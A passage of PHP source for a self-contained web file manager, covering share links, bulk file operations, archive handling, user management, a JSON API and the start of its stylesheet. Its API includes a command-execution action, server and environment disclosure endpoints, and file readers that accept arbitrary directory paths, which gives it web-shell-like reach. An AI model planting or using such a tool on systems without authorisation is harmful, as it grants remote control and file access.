            $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS|RecursiveDirectoryIterator::FOLLOW_SYMLINKS),RecursiveIteratorIterator::SELF_FIRST);
            foreach($it as $f){
                if(microtime(true)-$start>8){$capped=true;break;}
                if($f->isDir())$dirs++; else {$files++;$size+=$f->getSize();}
            }
        }catch(\Throwable $e){}
        return ['size'=>$size,'files'=>$files,'dirs'=>$dirs,'capped'=>$capped];
    }

    /* Share links */
    private function loadShares(){if(!file_exists($this->shareFile))return[];$d=@json_decode(@file_get_contents($this->shareFile),true);return is_array($d)?$d:[];}
    private function saveShares($s){
        $now=time();
        $s=array_values(array_filter($s,fn($x)=>empty($x['expires'])||$x['expires']>($now-604800)));
        @file_put_contents($this->shareFile,json_encode($s,JSON_PRETTY_PRINT));
    }
    public function getShares(){$s=$this->loadShares();usort($s,fn($a,$b)=>$b['created']<=>$a['created']);return $s;}
    private function createShare(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
        $p=$this->currentDir.'/'.$n;
        if(!is_file($p)){$this->addMsg('Only files can be shared.','danger');return;}
        $dur=isset($_POST['share_dur'])?$_POST['share_dur']:'1d';
        $map=['1h'=>3600,'1d'=>86400,'7d'=>604800,'30d'=>2592000,'never'=>0];
        $ttl=isset($map[$dur])?$map[$dur]:86400;
        $token=bin2hex(random_bytes(20));
        $shares=$this->loadShares();
        $shares[]=['id'=>bin2hex(random_bytes(6)),'token'=>$token,'path'=>realpath($p),'name'=>$n,'expires'=>$ttl>0?time()+$ttl:0,'created'=>time(),'by'=>isset($_SESSION['fm_user'])?$_SESSION['fm_user']:''];
        $this->saveShares($shares);
        $this->log('share_create',$n);
        $this->addMsg("Share link created for \"$n\".",'success');
    }
    private function revokeShare($id){
        $id=trim($id);if(!$id)return;
        $shares=$this->loadShares();
        $before=count($shares);
        $shares=array_values(array_filter($shares,fn($x)=>$x['id']!==$id));
        $this->saveShares($shares);
        if(count($shares)<$before){$this->log('share_revoke',$id);$this->addMsg('Share link revoked.','warning');}
    }

    private function batchRename(){
        $find=isset($_POST['br_find'])?$_POST['br_find']:'';
        $replace=isset($_POST['br_replace'])?$_POST['br_replace']:'';
        $mode=isset($_POST['br_mode'])?$_POST['br_mode']:'replace';
        $items=$this->getSelected();if(!$items){$this->addMsg('No items selected.','warning');return;}
        $ok=0;
        foreach($items as $n){
            if($mode==='prefix') $nw=$find.$n;
            elseif($mode==='suffix'){$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$nw=$base.$find.($ext?'.'.$ext:'');}
            else $nw=str_replace($find,$replace,$n);
            if($nw===$n||!$nw)continue;
            $src=$this->currentDir.'/'.$n;$dst=$this->currentDir.'/'.$nw;
            if(file_exists($src)&&!file_exists($dst)&&@rename($src,$dst))$ok++;
        }
        $this->log('batch_rename',"$ok files");$this->addMsg("Renamed $ok file(s).",'success');
    }

    /* Bulk */
    private function getSelected(){$raw=isset($_POST['items'])?$_POST['items']:'';$arr=json_decode($raw,true);if(!is_array($arr))return[];$r=[];foreach($arr as $n){$n=basename($n);if($n&&!$this->isSelf($n))$r[]=$n;}return $r;}
    private function bulkDel(){$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$ok=0;foreach($items as $n){if($this->rmdirR($this->currentDir.'/'.$n))$ok++;}$this->log('bulk_delete',"$ok");$this->addMsg("$ok deleted.",'warning');}
    private function rcopy($s,$d){if(is_dir($s)){if(!file_exists($d))@mkdir($d,0755,true);foreach(glob($s.'/*')as $i)$this->rcopy($i,$d.'/'.basename($i));return true;}return @copy($s,$d);}
    private function bulkCopyMove($mv){
        $items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}
        $target=isset($_POST['target'])?trim($_POST['target']):'';if(!$target||!is_dir($target)){$this->addMsg('Invalid target.','danger');return;}
        $ok=0;foreach($items as $n){$s=$this->currentDir.'/'.$n;$d=rtrim($target,'/').'/'.$n;if(file_exists($d))continue;if($mv){if(@rename($s,$d))$ok++;}else{if($this->rcopy($s,$d))$ok++;}}
        $this->log($mv?'bulk_move':'bulk_copy',"$ok");$this->addMsg("$ok ".($mv?'moved':'copied').".",'success');
    }

    /* ZIP */
    private function zadd($zip,$path,$base){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);foreach($it as $f){$zip->addFile($f->getPathname(),$base.'/'.substr($f->getPathname(),strlen($path)+1));}}
    private function zipCreate(){if(!class_exists('ZipArchive')){$this->addMsg('ZIP not available.','danger');return;}$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$zn='archive_'.date('Ymd_His').'.zip';$zp=$this->currentDir.'/'.$zn;$z=new ZipArchive();if($z->open($zp,ZipArchive::CREATE)!==true){$this->addMsg('Cannot create zip.','danger');return;}foreach($items as $n){$p=$this->currentDir.'/'.$n;if(is_dir($p))$this->zadd($z,$p,$n);elseif(is_file($p))$z->addFile($p,$n);}$z->close();$this->log('zip_create',$zn);$this->addMsg("Created $zn",'success');}
    private function zipExtract(){if(!class_exists('ZipArchive')){$this->addMsg('ZIP not available.','danger');return;}$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$p=$this->currentDir.'/'.$n;if(!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip'){$this->addMsg('Not a zip.','danger');return;}$t=$this->currentDir.'/'.pathinfo($n,PATHINFO_FILENAME);$z=new ZipArchive();if($z->open($p)===true){if(!file_exists($t))@mkdir($t,0755,true);$z->extractTo($t);$z->close();$this->log('zip_extract',$n);$this->addMsg('Extracted to '.basename($t).'/','success');}else $this->addMsg('Zip open failed.','danger');}

    /* TAR */
    private function tarCreate(){if(!function_exists('exec')){$this->addMsg('exec() disabled.','danger');return;}$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$tn='archive_'.date('Ymd_His').'.tar.gz';$tp=$this->currentDir.'/'.$tn;$is=implode(' ',array_map('escapeshellarg',$items));exec('cd '.escapeshellarg($this->currentDir).' && tar -czf '.escapeshellarg($tp)." $is 2>&1",$o,$e);if($e===0){$this->log('tar_create',$tn);$this->addMsg("Created $tn",'success');}else $this->addMsg('tar failed: '.implode(' ',$o),'danger');}
    private function tarExtract(){if(!function_exists('exec')){$this->addMsg('exec() disabled.','danger');return;}$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$p=$this->currentDir.'/'.$n;$ext=strtolower(pathinfo($n,PATHINFO_EXTENSION));$base=pathinfo($n,PATHINFO_FILENAME);if($ext==='gz'||$ext==='bz2')$base=pathinfo($base,PATHINFO_FILENAME);$t=$this->currentDir.'/'.$base;if(!file_exists($t))@mkdir($t,0755,true);exec('tar -xf '.escapeshellarg($p).' -C '.escapeshellarg($t).' 2>&1',$o,$e);if($e===0){$this->log('tar_extract',$n);$this->addMsg("Extracted to $base/",'success');}else $this->addMsg('Extract failed: '.implode(' ',$o),'danger');}

    /* Helpers */
    private function rmdirR($p){if(is_file($p)||is_link($p))return @unlink($p);if(is_dir($p)){foreach(glob($p.'/*')as $i)$this->rmdirR($i);return @rmdir($p);}return false;}
    private function isSelf($n){return realpath($this->currentDir.'/'.$n)===__FILE__;}

    /* Scan */
    public function scan(){
        $items=@scandir($this->currentDir);if($items===false)return['folders'=>[],'files'=>[]];
        $r=['folders'=>[],'files'=>[]];$self=basename(__FILE__);
        $q=isset($_GET['q'])?trim($_GET['q']):'';
        $sort=isset($_GET['sort'])?$_GET['sort']:'name';
        $sd=isset($_GET['sdir'])?$_GET['sdir']:'asc';
        $hidden=isset($_GET['hidden'])&&$_GET['hidden']==='1';
        $typeFilter=isset($_GET['tf'])?$_GET['tf']:'';
        foreach($items as $i){
            if($i==='.'||$i==='..') continue;
            if($i===$self&&$this->currentDir===__DIR__) continue;
            if(in_array($i,['.favorites.json','.users.json','.trash.json','.activity.json','.shares.json']))continue;
            if(!$hidden&&substr($i,0,1)==='.') continue;
            if($q!==''&&stripos($i,$q)===false) continue;
            $p=$this->currentDir.'/'.$i;
            $type=$this->getType($i);
            if($typeFilter!==''&&!is_dir($p)&&$typeFilter!=='all'){
                $g=['images'=>'image','videos'=>'video','audio'=>'audio','code'=>'code','docs'=>['pdf','word','excel'],'archives'=>'archive','text'=>'text'];
                $want=isset($g[$typeFilter])?$g[$typeFilter]:'';
                if(is_array($want)){if(!in_array($type,$want))continue;}
                elseif($want!==''&&$type!==$want)continue;
            }
            $info=['name'=>$i,'mtime'=>@filemtime($p),'size'=>is_file($p)?@filesize($p):0,'type'=>$type];
            if(is_dir($p))$r['folders'][]=$info;else $r['files'][]=$info;
        }
        $fn=fn($a,$b)=>($sd==='desc'?-1:1)*($sort==='mtime'?($a['mtime']<=>$b['mtime']):($sort==='size'?($a['size']<=>$b['size']):strnatcasecmp($a['name'],$b['name'])));
        usort($r['folders'],$fn);usort($r['files'],$fn);
        return $r;
    }

    public function getType($f){$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));$m=['jpg'=>'image','jpeg'=>'image','png'=>'image','gif'=>'image','svg'=>'image','webp'=>'image','ico'=>'image','bmp'=>'image','tiff'=>'image','avif'=>'image','mp4'=>'video','avi'=>'video','mkv'=>'video','mov'=>'video','webm'=>'video','flv'=>'video','mp3'=>'audio','wav'=>'audio','flac'=>'audio','ogg'=>'audio','aac'=>'audio','m4a'=>'audio','zip'=>'archive','rar'=>'archive','7z'=>'archive','tar'=>'archive','gz'=>'archive','bz2'=>'archive','tgz'=>'archive','xz'=>'archive','pdf'=>'pdf','doc'=>'word','docx'=>'word','odt'=>'word','xls'=>'excel','xlsx'=>'excel','ods'=>'excel','csv'=>'excel','php'=>'code','html'=>'code','htm'=>'code','css'=>'code','js'=>'code','ts'=>'code','jsx'=>'code','tsx'=>'code','py'=>'code','java'=>'code','sh'=>'code','bash'=>'code','rb'=>'code','go'=>'code','rs'=>'code','c'=>'code','cpp'=>'code','h'=>'code','vue'=>'code','svelte'=>'code','json'=>'data','xml'=>'data','yml'=>'data','yaml'=>'data','sql'=>'data','toml'=>'data','ini'=>'config','txt'=>'text','log'=>'text','md'=>'text','rst'=>'text','env'=>'config','gitignore'=>'config','htaccess'=>'config'];return isset($m[$e])?$m[$e]:'file';}
    public function getColor($t){$c=['image'=>'#f59e0b','video'=>'#ec4899','audio'=>'#8b5cf6','archive'=>'#f97316','pdf'=>'#ef4444','word'=>'#3b82f6','excel'=>'#22c55e','code'=>'#818cf8','data'=>'#06b6d4','text'=>'#94a3b8','config'=>'#fb7185','file'=>'#52525b'];return isset($c[$t])?$c[$t]:'#52525b';}
    public function canPreview($t){return in_array($t,['image','video','pdf','text','code','data','config']);}
    public function isTar($f){return in_array(strtolower(pathinfo($f,PATHINFO_EXTENSION)),['tar','gz','bz2','tgz','xz']);}
    public function breadcrumbs(){$d=$this->currentDir;$parts=explode(DIRECTORY_SEPARATOR,$d);$path='';$r=[];foreach($parts as $p){if($p==='')continue;$path.=DIRECTORY_SEPARATOR.$p;$r[]=['path'=>$path,'label'=>$p];}return $r;}
}

$fm=new FileManager();

/* ── API ── */
if(isset($_GET['x'])){
    header('Content-Type: application/json');
    if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){echo json_encode(['error'=>'Unauthorized']);exit;}
    $xop=$_GET['x'];
    if($xop==='run'){
        if($fm->isRO()){echo json_encode(['error'=>'Read-only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $qi=isset($_POST['qi'])?trim($_POST['qi']):'';
        echo json_encode($fm->runCmd($qi));exit;
    }
    if($xop==='ac'){
        $prefix=isset($_GET['prefix'])?$_GET['prefix']:'';
        echo json_encode($fm->autocomplete($prefix));exit;
    }
    if($xop==='cs'){$fn=isset($_GET['f'])?basename($_GET['f']):'';echo json_encode($fn?$fm->checksum($fn):['error'=>'No file']);exit;}
    if($xop==='dirsize'){
        $fn=basename(isset($_GET['f'])?$_GET['f']:'');
        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
        $rp=$dir?realpath($dir.'/'.$fn):false;
        if(!$rp||!is_dir($rp)){echo json_encode(['error'=>'Not found']);exit;}
        echo json_encode($fm->dirSize($rp));exit;
    }
    if($xop==='lg'){echo json_encode(array_slice($fm->getLogs(),0,300));exit;}
    if($xop==='sv'){
        $ss=$fm->sysStats();
        echo json_encode(['php'=>PHP_VERSION,'os'=>PHP_OS.' '.php_uname('r'),'server'=>$_SERVER['SERVER_SOFTWARE']??'PHP Built-in','memory_limit'=>ini_get('memory_limit'),'mem_usage'=>fmtSz(memory_get_usage(true)),'mem_peak'=>fmtSz(memory_get_peak_usage(true)),'upload_max'=>ini_get('upload_max_filesize'),'post_max'=>ini_get('post_max_size'),'max_exec'=>ini_get('max_execution_time').'s','exts'=>get_loaded_extensions(),'disk_total'=>fmtSz(@disk_total_space(__DIR__)?:0),'disk_free'=>fmtSz(@disk_free_space(__DIR__)?:0),'sapi'=>PHP_SAPI,'tz'=>date_default_timezone_get(),'cwd'=>getcwd(),
            'load'=>$ss['load'],'mem_total'=>fmtSz($ss['mem_total']),'mem_used'=>fmtSz($ss['mem_used']),'mem_pct'=>$ss['mem_pct'],'uptime'=>fmtUptime($ss['uptime']),'hostname'=>$ss['hostname'],'server_ip'=>$ss['server_ip'],'client_ip'=>$ss['client_ip'],'disk_pct'=>$ss['disk_pct'],'cpu_cores'=>$ss['cpu_cores'],'cpu_model'=>$ss['cpu_model']]);exit;
    }
    if($xop==='svlite'){echo json_encode($fm->sysStats());exit;}
    if($xop==='errlog'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->getErrLog(300));exit;
    }
    if($xop==='envvars'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->getEnvSafe());exit;
    }
    if($xop==='phpinfo'){
        if(empty($_SESSION['fm_admin'])){http_response_code(403);header('Content-Type: text/plain');echo 'Admins only.';exit;}
        header('Content-Type: text/html;charset=utf-8');phpinfo();exit;
    }
    if($xop==='largefiles'){
        $mb=isset($_GET['mb'])?max(1,(float)$_GET['mb']):50;
        echo json_encode($fm->findLargeFiles($mb*1024*1024));exit;
    }
    if($xop==='duplicates'){
        echo json_encode($fm->findDuplicates());exit;
    }
    if($xop==='speedping'){echo json_encode(['t'=>microtime(true)]);exit;}
    if($xop==='speeddown'){
        $mb=isset($_GET['mb'])?min(30,max(1,(float)$_GET['mb'])):5;
        $bytes=(int)($mb*1024*1024);
        header('Content-Type: application/octet-stream');header('Content-Length: '.$bytes);
        header('Cache-Control: no-store');header('X-Accel-Buffering: no');
        while(ob_get_level())ob_end_flush();
        $chunk=random_bytes(65536);$sent=0;
        while($sent<$bytes){$n=min(65536,$bytes-$sent);echo substr($chunk,0,$n);$sent+=$n;@flush();}
        exit;
    }
    if($xop==='speedup'){
        $len=isset($_SERVER['CONTENT_LENGTH'])?(int)$_SERVER['CONTENT_LENGTH']:strlen(@file_get_contents('php://input'));
        echo json_encode(['received'=>$len]);exit;
    }
    if($xop==='ls'){echo json_encode(array_values(array_filter(scandir($fm->getCwd())?:[],fn($x)=>$x!=='.'&&$x!=='..')));exit;}
    if($xop==='imgprev'){
        /* Thumbnail resize — served as image/jpeg */
        $fn=isset($_GET['f'])?basename($_GET['f']):'';
        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
        $fp=$dir.'/'.$fn;
        if(!$fp||!is_file($fp)||!in_array(strtolower(pathinfo($fp,PATHINFO_EXTENSION)),['jpg','jpeg','png','gif','webp','bmp'])){http_response_code(404);exit;}
        $src=@imagecreatefromstring(@file_get_contents($fp));
        if(!$src){readfile($fp);exit;}
        $w=imagesx($src);$h=imagesy($src);$th=160;$tw=round($w*$th/$h);
        $dst=imagecreatetruecolor($tw,$th);imagecopyresampled($dst,$src,0,0,0,0,$tw,$th,$w,$h);
        header('Content-Type: image/jpeg');header('Cache-Control: max-age=86400');
        imagejpeg($dst,null,78);imagedestroy($src);imagedestroy($dst);exit;
    }
    if($xop==='notes'){
        /* Quick notes — save/load per-directory */
        $nf=$fm->getCwd().'/.fm_notes.txt';
        if($_SERVER['REQUEST_METHOD']==='POST'){
            if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
            $txt=isset($_POST['body'])?$_POST['body']:'';
            @file_put_contents($nf,$txt);echo json_encode(['ok'=>true]);exit;
        }
        echo json_encode(['body'=>file_exists($nf)?@file_get_contents($nf):'']);exit;
    }
    echo json_encode(['error'=>'Unknown']);exit;
}

/* ── Raw ── */
if(isset($_GET['raw'])){
    $fn=basename($_GET['raw']);$dir=isset($_GET['dir'])?realpath($_GET['dir']):__DIR__;if($dir===false)$dir=__DIR__;
    $fp=realpath($dir.'/'.$fn);
    if($fp&&is_file($fp)&&$fp!==__FILE__){
        $mime=function_exists('mime_content_type')?@mime_content_type($fp):'application/octet-stream';
        if(!$mime)$mime='application/octet-stream';
        header('Content-Type: '.$mime);header('Content-Length: '.filesize($fp));
        if(isset($_GET['dl']))header('Content-Disposition: attachment; filename="'.$fn.'"');
        readfile($fp);exit;
    }
    http_response_code(404);exit;
}

function fmtSz($b){if($b>=1073741824)return round($b/1073741824,2).' GB';if($b>=1048576)return round($b/1048576,1).' MB';if($b>=1024)return round($b/1024,1).' KB';return $b.' B';}
function fmtUptime($s){$s=(int)$s;$d=intdiv($s,86400);$h=intdiv($s%86400,3600);$m=intdiv($s%3600,60);if($d>0)return $d.'d '.$h.'h';if($h>0)return $h.'h '.$m.'m';return $m.'m';}
$fm->handle();

/* ── User management ── */
$userMsg=null;
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['action'])&&in_array($_POST['action'],['add_user','remove_user'])){
    if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$userMsg=['Security error.','danger'];}
    elseif(empty($_SESSION['fm_admin'])){$userMsg=['Admins only.','danger'];}
    else{$users=fm_load_users($usersFile);
        if($_POST['action']==='add_user'){$nu=trim(isset($_POST['new_user'])?$_POST['new_user']:'');$np=isset($_POST['new_pass'])?$_POST['new_pass']:'';$nr=trim(isset($_POST['new_root'])?$_POST['new_root']:'');$nro=isset($_POST['new_readonly'])&&$_POST['new_readonly']==='1';
            if(!$nu||!$np){$userMsg=['Username and password required.','danger'];}elseif(fm_find_user($users,$nu)){$userMsg=['Username exists.','danger'];}elseif($nr!==''&&!is_dir($nr)){$userMsg=['Folder not found.','danger'];}
            else{$users[]=['user'=>$nu,'hash'=>password_hash($np,PASSWORD_DEFAULT),'root'=>$nr,'readonly'=>$nro,'admin'=>false];fm_save_users($usersFile,$users);$userMsg=["User '$nu' created.",'success'];}
        }elseif($_POST['action']==='remove_user'){$tu=trim(isset($_POST['target_user'])?$_POST['target_user']:'');
            if($tu==='admin'||$tu===$_SESSION['fm_user']){$userMsg=['Cannot remove this account.','danger'];}
            else{$users=array_values(array_filter($users,fn($u)=>$u['user']!==$tu));fm_save_users($usersFile,$users);$userMsg=["User '$tu' removed.",'success'];}
        }
    }
    header("Location: ".basename(__FILE__)."?dir=".urlencode($fm->getCwd())."&umsg=".urlencode($userMsg[0])."&utype=".urlencode($userMsg[1]));exit;
}
if(isset($_GET['umsg']))$fm->addMsg($_GET['umsg'],isset($_GET['utype'])?$_GET['utype']:'success');

$list=$fm->scan();
$editMode=false;$editContent='';$editFile='';
if(isset($_GET['edit'])){$fn=basename($_GET['edit']);$fp=realpath($fm->getCwd().'/'.$fn);if($fp&&is_file($fp)&&$fp!==__FILE__){$editMode=true;$editFile=$fn;$editContent=file_get_contents($fp);}}

$totalFolders=count($list['folders']);$totalFiles=count($list['files']);
$totalSize=0;foreach($list['files']as $f)$totalSize+=$f['size'];
$diskTotal=$fm->diskTotal();$diskFree=$fm->diskFree();$diskUsed=$diskTotal-$diskFree;$diskPct=$diskTotal>0?round(($diskUsed/$diskTotal)*100):0;
$curSort=isset($_GET['sort'])?$_GET['sort']:'name';$curDir_=isset($_GET['sdir'])?$_GET['sdir']:'asc';
$curHidden=isset($_GET['hidden'])&&$_GET['hidden']==='1';$curTF=isset($_GET['tf'])?$_GET['tf']:'';
function sortUrl($col){global $curSort,$curDir_;$d=($curSort===$col&&$curDir_==='asc')?'desc':'asc';$q=$_GET;$q['sort']=$col;$q['sdir']=$d;return '?'.http_build_query($q);}

function svgFolder(){return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(129,140,248,.15)"/></svg>';}
function svgFile($t='file'){global $fm;$color=$fm->getColor($t);$p=['image'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>','video'=>'<rect x="2" y="5" width="14" height="14" rx="2"/><path d="M16 10l6-4v12l-6-4z"/>','audio'=>'<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>','archive'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 3v18M14 8h2M14 12h2M14 16h2"/>','pdf'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><text x="12" y="18" font-size="6" text-anchor="middle" fill="currentColor" stroke="none" font-weight="700">PDF</text>','word'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/>','excel'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><path d="M9.5 13l5 6M14.5 13l-5 6"/>','code'=>'<polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>','data'=>'<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>','text'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>','config'=>'<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82V9a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9z"/>','file'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>'];$inner=isset($p[$t])?$p[$t]:$p['file'];return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="'.$color.'" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">'.$inner.'</svg>';}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>File Manager</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
/* ══ RESET & TOKENS ══ */
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#09090b;--panel:#0d0d10;--surf:#111115;--raised:#18181c;--hov:#1c1c21;--act:#222228;
  --border:rgba(255,255,255,.065);--border2:rgba(255,255,255,.12);
  --t1:#f4f4f5;--t2:#71717a;--t3:#3f3f46;--link:#818cf8;
  --indigo:#6366f1;--indigo2:#4f46e5;
  --green:#22c55e;--amber:#f59e0b;--red:#ef4444;--blue:#3b82f6;--pink:#ec4899;--purple:#8b5cf6;
  --sw:240px;--th:52px;--bh:26px;
  --r:10px;--rlg:14px;--rxl:18px;
  --spring:cubic-bezier(.34,1.56,.64,1);--out:cubic-bezier(.25,.46,.45,.94);
}
html{height:100%;-webkit-tap-highlight-color:transparent}
body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t1);font-size:13.5px;line-height:1.5;height:100vh;overflow:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}

/* ══ LAYOUT ══ */
.shell{display:grid;grid-template:"tb tb" var(--th) "sb main" 1fr "bar bar" var(--bh) / var(--sw) 1fr;height:100vh;overflow:hidden}

/* ══ TOPBAR ══ */
.topbar{grid-area:tb;background:var(--panel);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 10px;gap:6px;z-index:200;min-width:0}
.brand{display:flex;align-items:center;gap:8px;width:var(--sw);flex-shrink:0;text-decoration:none;padding-right:4px;min-width:0}
.brand-icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:transform .25s var(--spring)}
.brand-icon:hover{transform:scale(1.12)}
.brand-icon svg{width:24px;height:24px;stroke:#818cf8;fill:none;stroke-width:1.6;stroke-linecap:round;stroke-linejoin:round}
.brand-name{font-size:13px;font-weight:700;color:var(--t1);letter-spacing:-.2px;white-space:nowrap}
.dv{width:1px;height:18px;background:var(--border);flex-shrink:0}
.bc{display:flex;align-items:center;flex:1;overflow:hidden;min-width:0}
.bc-crumb{display:flex;align-items:center;animation:fadeSlide .3s var(--spring) both}
@keyframes fadeSlide{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:none}}
.bc-crumb:nth-child(n+2){animation-delay:.05s}
.bc a{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--t2);text-decoration:none;padding:3px 6px;border-radius:6px;transition:background .15s,color .15s;white-space:nowrap;max-width:120px;overflow:hidden;text-overflow:ellipsis;display:inline-block}
.bc a:hover{background:var(--hov);color:var(--link)}.bc a.last{color:var(--t1);font-weight:600}
.bc-sep{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--t3);padding:0 1px;user-select:none}
.tb-right{display:flex;align-items:center;gap:4px;margin-left:auto;flex-shrink:0}
.tsearch{display:flex;align-items:center;gap:6px;background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:var(--r);padding:0 4px 0 10px;transition:border-color .18s}
.tsearch:focus-within{border-color:rgba(99,102,241,.5)}
.tsearch svg{width:13px;height:13px;stroke:var(--t3);fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
.tsearch input{background:transparent;border:none;outline:none;color:var(--t1);font-size:12px;padding:6px 4px;width:150px}
.tsearch input::placeholder{color:var(--t3)}

/* ══ SIDEBAR ══ */
.sidebar{grid-area:sb;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
.sb-sec{padding:10px 8px 0}
.sb-label{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);padding:3px 10px 5px;display:flex;align-items:center;justify-content:space-between}
.sb-nav{display:flex;flex-direction:column;gap:1px}
.sb-item{display:flex;align-items:center;gap:8px;padding:7px 10px;border-radius:var(--r);color:var(--t2);text-decoration:none;font-size:12.5px;font-weight:500;transition:background .15s,color .15s,transform .18s var(--spring);cursor:pointer;border:none;background:transparent;width:100%;text-align:left;white-space:nowrap;overflow:hidden}
.sb-item svg{width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0;transition:transform .18s var(--spring)}
.sb-item:hover{background:var(--hov);color:var(--t1);transform:translateX(2px)}.sb-item:hover svg{transform:scale(1.1)}.sb-item:active{transform:scale(.97)}
.sb-item.danger:hover{background:rgba(239,68,68,.08);color:#fca5a5}
.sb-div{height:1px;background:var(--border);margin:6px 10px}
.sb-scroll{flex:1;overflow-y:auto;overflow-x:hidden;padding:0 8px 8px;min-height:0}
.sb-scroll::-webkit-scrollbar{width:3px}.sb-scroll::-webkit-scrollbar-thumb{background:rgba(255,255,255,.07);border-radius:6px}
.sb-flink{display:flex;align-items:center;gap:7px;padding:6px 10px;border-radius:var(--r);color:var(--t2);text-decoration:none;font-size:12.5px;transition:background .15s,color .15s,transform .18s var(--spring)}
.sb-flink svg{width:14px;height:14px;flex-shrink:0;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round}
